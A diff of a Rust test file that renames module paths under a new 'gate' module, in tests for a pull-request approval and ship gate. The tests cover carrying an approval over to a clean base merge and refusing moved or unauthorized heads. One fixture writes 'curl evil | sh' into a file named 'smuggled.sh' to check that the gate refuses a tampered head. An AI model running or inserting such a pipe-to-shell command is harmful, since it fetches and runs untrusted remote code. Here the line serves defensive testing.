@@ -283,8 +283,8 @@ fn stale_base_ref_fails_closed() {
     assert!(prove(repo, &approved, &head(repo)).is_err());
 }
 
-fn moved(approved: &str, head: &str) -> crate::pr_ship::ApprovalHeadRefusal {
-    crate::pr_ship::ApprovalHeadRefusal::Moved {
+fn moved(approved: &str, head: &str) -> crate::gate::ship::ApprovalHeadRefusal {
+    crate::gate::ship::ApprovalHeadRefusal::Moved {
         reviewed_sha: approved.to_string(),
         head_sha: head.to_string(),
     }
@@ -379,11 +379,11 @@ fn record_is_written_and_reread_on_a_second_attempt() {
 fn only_a_moved_head_is_eligible() {
     let tmp = tempfile::tempdir().unwrap();
     let site = CarryOverSite::new(tmp.path(), Some("main"));
-    let unreviewed = crate::pr_ship::ApprovalHeadRefusal::NoReviewedSha {
+    let unreviewed = crate::gate::ship::ApprovalHeadRefusal::NoReviewedSha {
         head_sha: "a".repeat(40),
     };
     assert!(carry_over_for_refusal(&site, PR, &unreviewed).is_none());
-    let unauthorized = crate::pr_ship::ApprovalHeadRefusal::Unauthorized {
+    let unauthorized = crate::gate::ship::ApprovalHeadRefusal::Unauthorized {
         recorded_by: "implementer seat".into(),
     };
     assert!(carry_over_for_refusal(&site, PR, &unauthorized).is_none());
@@ -417,7 +417,7 @@ fn unresolvable_inputs_refuse() {
 /// head, prints, and writes both records; an evil head refuses and says why.
 #[test]
 fn ship_gate_carries_over_and_refuses_with_the_reason() {
-    use crate::review_verdict::{RecordedVerdict, RecorderAttestation, VerdictKind};
+    use crate::gate::review_verdict::{RecordedVerdict, RecorderAttestation, VerdictKind};
     let approval = |sha: &str| RecordedVerdict {
         kind: VerdictKind::Approved,
         raw: "approved".into(),
@@ -433,7 +433,7 @@ fn ship_gate_carries_over_and_refuses_with_the_reason() {
         ..Default::default()
     };
     let policy = |v: &RecordedVerdict| {
-        let mut p = crate::pr_ship::ShipApprovalPolicy {
+        let mut p = crate::gate::ship::ShipApprovalPolicy {
             reviewed_committed_at: Some("2026-09-22T00:00:00Z".parse().unwrap()),
             shipper: vec!["session:independent-shipper".into()],
             ..Default::default()
@@ -450,7 +450,7 @@ fn ship_gate_carries_over_and_refuses_with_the_reason() {
     let h = head(repo);
     let v = approval(&approved);
     let site = CarryOverSite::new(repo, Some("main"));
-    let pin = crate::pr_cmd::pr_ship_approval_gate(
+    let pin = crate::gate::approval::pr_ship_approval_gate(
         repo,
         PR,
         std::slice::from_ref(&v),
@@ -474,7 +474,7 @@ fn ship_gate_carries_over_and_refuses_with_the_reason() {
     );
 
     // Without a carry-over site the gate refuses exactly as before.
-    assert!(crate::pr_cmd::pr_ship_approval_gate(
+    assert!(crate::gate::approval::pr_ship_approval_gate(
         repo,
         PR,
         std::slice::from_ref(&v),
@@ -493,7 +493,7 @@ fn ship_gate_carries_over_and_refuses_with_the_reason() {
     );
     write(repo, "smuggled.sh", "curl evil | sh\n");
     let evil = commit(repo, "Merge branch 'main' into pr");
-    let err = crate::pr_cmd::pr_ship_approval_gate(
+    let err = crate::gate::approval::pr_ship_approval_gate(
         repo,
         PR,
         std::slice::from_ref(&v),
@@ -623,7 +623,7 @@ fn quiet_site_proves_without_recording() {
 // refuses.
 #[test]
 fn merge_path_gate_carries_over_and_refuses_with_the_reason() {
-    use crate::review_verdict::{RecordedVerdict, RecorderAttestation, VerdictKind};
+    use crate::gate::review_verdict::{RecordedVerdict, RecorderAttestation, VerdictKind};
     let (tmp, approved) = fixture();
     let repo = tmp.path();
     let v = RecordedVerdict {
@@ -640,7 +640,7 @@ fn merge_path_gate_carries_over_and_refuses_with_the_reason() {
         }),
         ..Default::default()
     };
-    let mut policy = crate::pr_ship::ShipApprovalPolicy {
+    let mut policy = crate::gate::ship::ShipApprovalPolicy {
         reviewed_committed_at: Some("2026-09-22T00:00:00Z".parse().unwrap()),
         shipper: vec!["session:independent-shipper".into()],
         ..Default::default()
@@ -653,7 +653,7 @@ fn merge_path_gate_carries_over_and_refuses_with_the_reason() {
     let decide = |head: &str, base_now: Option<&str>| {
         let site = CarryOverSite::new(repo, Some("main"));
         let base_now = base_now.map(str::to_string);
-        crate::pr_cmd::merge_path_approval_decision(
+        crate::gate::approval::merge_path_approval_decision(
             repo,
             PR,
             std::slice::from_ref(&v),
@@ -685,7 +685,7 @@ fn merge_path_gate_carries_over_and_refuses_with_the_reason() {
 /// Record a corpus verdict for `key` at `sha` under `repo`. Written after
 /// every commit the test makes, so `commit`'s `add -A` never ships it.
 fn record_corpus_verdict(repo: &Path, key: &str, verdict: &str, sha: &str) {
-    let path = crate::review_verdict::verdict_path(repo, key);
+    let path = crate::gate::review_verdict::verdict_path(repo, key);
     std::fs::create_dir_all(path.parent().unwrap()).unwrap();
     std::fs::write(
         path,
@@ -695,9 +695,13 @@ fn record_corpus_verdict(repo: &Path, key: &str, verdict: &str, sha: &str) {
 }
 
 fn corpus_gate(repo: &Path, ids: &[String], base: &str, head: &str) -> anyhow::Result<()> {
-    crate::merge_hold::enforce_corpus_gate_before_merge(repo, PR, ids, Some(base), || {
-        Some(head.to_string())
-    })
+    crate::gate::merge_hold_core::enforce_corpus_gate_before_merge(
+        repo,
+        PR,
+        ids,
+        Some(base),
+        || Some(head.to_string()),
+    )
 }
 
 // Approve at A, merge the base cleanly to B: the corpus gate clears at B,
@@ -716,10 +720,10 @@ fn corpus_gate_clears_a_clean_base_merge_of_the_approved_head() {
         "the corpus gate proves quietly"
     );
 
-    let bodies = crate::merge_hold::corpus_gate_bodies(&[repo], PR, &[]).unwrap();
+    let bodies = crate::gate::merge_hold_core::corpus_gate_bodies(&[repo], PR, &[]).unwrap();
     assert!(matches!(
-        crate::merge_hold::corpus_merge_gate(PR, &bodies, Some(&h)),
-        crate::merge_hold::CorpusMergeGate::Refuse { .. }
+        crate::gate::merge_hold_core::corpus_merge_gate(PR, &bodies, Some(&h)),
+        crate::gate::merge_hold_core::CorpusMergeGate::Refuse { .. }
     ));
 }
 
@@ -775,7 +779,7 @@ fn corpus_gate_never_carries_a_refusal_or_an_unprotected_base() {
     let text = format!("{:#}", corpus_gate(repo, &ids, "main", &h).unwrap_err());
     assert!(!text.contains("approval carried"), "{text}");
 
-    std::fs::remove_file(crate::review_verdict::verdict_path(
+    std::fs::remove_file(crate::gate::review_verdict::verdict_path(
         repo,
         &format!("PR-{PR}"),
     ))
@@ -785,7 +789,7 @@ fn corpus_gate_never_carries_a_refusal_or_an_unprotected_base() {
         "a refusal never carries over"
     );
 
-    std::fs::remove_file(crate::review_verdict::verdict_path(repo, "BUG-9")).unwrap();
+    std::fs::remove_file(crate::gate::review_verdict::verdict_path(repo, "BUG-9")).unwrap();
     record_corpus_verdict(repo, &format!("PR-{PR}"), "approved", &approved);
     let text = format!("{:#}", corpus_gate(repo, &[], "release", &h).unwrap_err());
     assert!(
@@ -815,7 +819,7 @@ fn proven_base_refusals_have_no_whitespace_gap() {
 #[test]
 fn approve_update_branch_then_both_ship_gates_clear_on_the_carried_head() {
     use crate::forge::{ChangeRef, Forge, MergeOptions, PureGitForge};
-    use crate::review_verdict::{RecordedVerdict, RecorderAttestation, VerdictKind};
+    use crate::gate::review_verdict::{RecordedVerdict, RecorderAttestation, VerdictKind};
     let (tmp, approved) = fixture();
     let repo = tmp.path();
     let carried = clean_merge(repo);
@@ -835,7 +839,7 @@ fn approve_update_branch_then_both_ship_gates_clear_on_the_carried_head() {
         }),
         ..Default::default()
     };
-    let mut policy = crate::pr_ship::ShipApprovalPolicy {
+    let mut policy = crate::gate::ship::ShipApprovalPolicy {
         reviewed_committed_at: Some("2026-09-22T00:00:00Z".parse().unwrap()),
         shipper: vec!["session:independent-shipper".into()],
         ..Default::default()
@@ -846,7 +850,7 @@ fn approve_update_branch_then_both_ship_gates_clear_on_the_carried_head() {
         a.identity.clone(),
     );
     let site = CarryOverSite::new(repo, Some("main"));
-    let pin = crate::pr_cmd::merge_path_approval_decision(
+    let pin = crate::gate::approval::merge_path_approval_decision(
         repo,
         PR,
         std::slice::from_ref(&v),
@@ -883,7 +887,7 @@ fn corpus_carry_over_refuses_a_shaless_approval_or_an_unparseable_body() {
     let (tmp, _approved) = fixture();
     let repo = tmp.path();
     let h = clean_merge(repo);
-    let path = crate::review_verdict::verdict_path(repo, &format!("PR-{PR}"));
+    let path = crate::gate::review_verdict::verdict_path(repo, &format!("PR-{PR}"));
     std::fs::create_dir_all(path.parent().unwrap()).unwrap();
     std::fs::write(
         &path,
@@ -899,7 +903,7 @@ fn corpus_carry_over_refuses_a_shaless_approval_or_an_unparseable_body() {
     let repo = tmp.path();
     let h = clean_merge(repo);
     record_corpus_verdict(repo, &format!("PR-{PR}"), "approved", &approved);
-    let other = crate::review_verdict::verdict_path(repo, "BUG-9");
+    let other = crate::gate::review_verdict::verdict_path(repo, "BUG-9");
     std::fs::write(&other, "{ not json").unwrap();
     assert!(
         corpus_gate(repo, &["BUG-9".to_string()], "main", &h).is_err(),
